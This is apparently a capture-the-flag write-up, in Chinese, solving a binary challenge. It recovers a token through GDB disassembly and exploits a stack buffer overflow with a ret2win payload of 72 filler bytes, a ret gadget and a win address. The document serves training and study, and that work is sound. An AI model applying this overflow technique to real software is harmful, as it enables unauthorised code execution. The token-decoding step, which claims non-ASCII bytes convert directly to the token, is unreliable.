# Barbieland Buffer Blowout

## 題目描述

A glamorous Barbieland relay kiosk still accepts calibration input before unlocking its backstage tools. Work the console correctly and recover the final pink protocol message.

## 解題思路

1. **第一步**：

   先想辦法拿 token，所以在 GDB 裡面反組譯 `main` 之後，找到了 `check_token`，並且 token 長度為 16 bytes：

   ```text
   0x00000000004012f3 <+24>:    call   0x401130 <strlen@plt>
   0x00000000004012f8 <+29>:    cmp    $0x10,%rax
   ```

   又找到了 `target`，也就是 token：

   ```text
   0x000000000040137b <+160>:   cltq
   0x000000000040137d <+162>:   lea    0xdcc(%rip),%rdx        # 0x402150 <target.0>
   0x0000000000401384 <+169>:   movzbl (%rax,%rdx,1),%eax
   0x0000000000401388 <+173>:   cmp    %al,-0x19(%rbp)
   ```

   `target` 裡面長這樣：

   ```text
   0x402150 <target.0>:    0x5a    0x06    0xb5    0x86    0x17    0x08    0x8e 0xba
   0x402158 <target.0+8>:  0xd6    0xd4    0xd7    0x06    0xb7    0x96    0x38 0xae
   ```

   然後 hex to bytes 之後會變成：

   ```text
   B4RB13-C0R3GL4M!
   ```

   這就是 token 了。

2. **第二步**：

   觀察 `vulnerable_prompt` 會發現：

   ```text
   0x0000000000401525 <+8>:     sub    $0x40,%rsp
   ...
   0x0000000000401560 <+67>:    lea    -0x40(%rbp),%rax
   0x0000000000401564 <+71>:    mov    $0x100,%edx
   0x0000000000401569 <+76>:    mov    %rax,%rsi
   0x000000000040156c <+79>:    mov    $0x0,%edi
   0x0000000000401571 <+84>:    call   0x401160 <read@plt>
   ```

   buffer 只有 64 bytes，但 `read()` 可以讀到 256 bytes，所以可以 overflow。

   把 buffer 跟 saved RBP overflow 掉需要 `64 + 8 = 72` bytes，所以前面塞了 72 個 `A`。

   並且這題沒有 PIE，可以直接 ret2win。用 GDB 掃一遍 functions 可以發現有一個 `win` function 在 `0x4013c3`，跳過去就可以拿到 flag。

   payload 為：

   ```python
   b"A" * 72 + p64(0x40101a) + p64(0x4013c3)
   ```

   其中 `0x40101a` 是 `ret`，`0x4013c3` 是 `win`。

## Flag

```text
bitctf{{b4rb13_buff3r_b10w0u7}}
```
